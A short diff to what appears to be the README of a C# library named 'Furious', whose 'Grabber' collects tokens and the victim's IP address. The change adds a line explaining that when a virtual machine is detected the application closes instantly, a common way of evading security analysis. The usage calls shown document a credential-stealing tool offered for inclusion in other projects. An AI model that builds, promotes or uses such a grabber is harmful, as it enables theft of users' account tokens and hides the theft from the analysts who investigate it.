@@ -11,7 +11,7 @@ Build the DLL and reference it in your project(s): ```using Furious;```
 #### To grab tokens + IP address
 ```Furious.Grabber.Start(true);```
 #### To check for a VM before attempting to grab anything
-```Furious.Grabber.Start(grabIP: true, checkForVM: true);```
+```Furious.Grabber.Start(grabIP: true, checkForVM: true);``` - if a VM is detected, the application will close instantly.
 
 
 # Requests
